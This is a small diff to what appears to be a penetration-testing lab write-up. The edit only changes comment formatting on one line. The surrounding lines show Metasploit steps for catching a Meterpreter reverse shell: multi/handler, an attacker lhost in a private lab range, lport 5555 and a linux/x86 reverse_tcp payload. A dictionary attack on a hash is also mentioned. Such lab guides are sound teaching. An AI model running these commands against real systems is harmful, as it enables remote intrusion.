@@ -576,7 +576,7 @@ B) Perform a dictionary attack against the hash:
 - Use the multi/handler module to use the listener & wait for incoming payload connections: `use exploit/multi/handler`
 
 - Set the required options to match the payload (matching settings with msfvenom):
-  - `set lhost 192.168.56.3 `   # IP address of the Kali VM (attacker)
+  - `set lhost 192.168.56.3 `   IP address of the Kali VM (attacker)
   - `set lport 5555`
   - `set payload linux/x86/meterpreter/reverse_tcp `
 
